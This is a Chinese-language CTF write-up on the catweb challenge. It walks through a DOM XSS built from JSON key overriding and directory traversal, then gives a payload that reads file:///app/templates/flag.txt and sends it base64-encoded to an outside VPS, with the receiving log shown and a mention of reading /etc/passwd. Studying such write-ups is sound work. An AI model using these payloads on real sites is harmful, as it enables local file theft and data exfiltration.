...
这道题出的确实好，详细写一下。这题我XSS已经打出来了，但后面的操作属实没想到

首先可以看到index页拼接了HTML，那么存在DOM XSS没跑了
...
请求一下`/cats?kind=black`

```
$ curl "http://catweb.zajebistyc.tf/cats?kind=black" -x socks5://127.0.0.1
{"status": "ok", "content": ["il_570xN.1285759626_8j8m.jpg", "24.jpg", "2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg"]}
```

发现是一个列目录功能，那么能不能目录穿越呢，是可以的（这点我没想到，后面再说）

先尝试打一下DOM XSS

我们需要利用JSON接口的返回值来构造XSS，尝试一下发现JSON接口只是做了简单拼接，而没有转义字符

```
$ curl "http://catweb.zajebistyc.tf/cats?kind=123\"\}" -x socks5://127.0.0.1
{"status": "error", "content": "123"} could not be found"}
```

那么我们需要构造使得status == "ok"，这里需要知道，JSON在解析的过程中，键值是可以存在覆盖的
...
那么我们覆盖status和content即可

```
/?grey","status":"ok","content":["\"><script>alert(1)</script><!--"],"a":"
```

成功alert

提交给bot后发现，HTML源码，storage，history，cookie里都没有flag，尝试了一下内网也没有找到有用信息，然后我就卡在了这里

还记得之前提到的列目录的目录穿越吗，我们试一下：

```
$ curl "http://catweb.zajebistyc.tf/cats?kind=.." -x socks5://127.0.0.1
...
$ curl "http://catweb.zajebistyc.tf/cats?kind=../templates" -x socks5://127.0.0.1
{"status": "ok", "content": ["report.html", "index.html", "flag.txt"]}
```

怎么打？file协议，但是直接这样肯定不行：

```
http://catweb.zajebistyc.tf/?grey","status":"ok","content":["\"><script>fetch('file:///app/templates/flag.txt')</script><!--"],"a":"
```

为什么？跨域了，file协议本身也有源，那么什么情况下两个file是同源的？MDN上说了：
...
Gecko1.8之后的file特权域也会有同源策略的限制，但这里的情况当然符合同源：通过`/app/template/index.html`读取`/app/template/flag.txt`内容

P.s. 实际上，主流浏览器里，只有FF有file域的同源策略，其他浏览器压根不支持在file文档中通过XHR请求file协议

又因为index.html其实是个静态文件，那么可以构造出payload：

```
file:///app/templates/index.html?grey","status":"ok","content":["\"><script>fetch('file:///app/templates/flag.txt').then(r=>r.text()).then(data=>fetch('http://116.62.181.100/'%2Bbtoa(data)))</script><!--"],"a":"
```

VPS上接收请求

```
[Mon Mar 16 12:12:48 2020] 157.230.22.175:56266 [404]: /cDR7Y2FuX2lfaGF6X2FfcGllY2Vfb2ZfZmxhZ19wbGl6P30K - No such file or directory
```

但实际上这里我发现一个严重的问题，题目的FF版本是`Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0`，大概是19年发布的。我测试发现可以成功读到`/etc/passwd`的内容，也就是说，SOP在这里并没有ban掉跨file域的请求

```
Connection from [157.230.22.175] port 80 [tcp/http] accepted (family 2, sport 50034)
GET  HTTP/1.1      Host: 116.62.181.100
...
这就看不懂了，我试了FF68和FF45都没有这个问题，事实上它们三者都是`Gecko/20100101`

### templateJS

这道题应该要利用ES6的某些新特性，只要白名单再多一个`.`我就可以绕了，可它没有
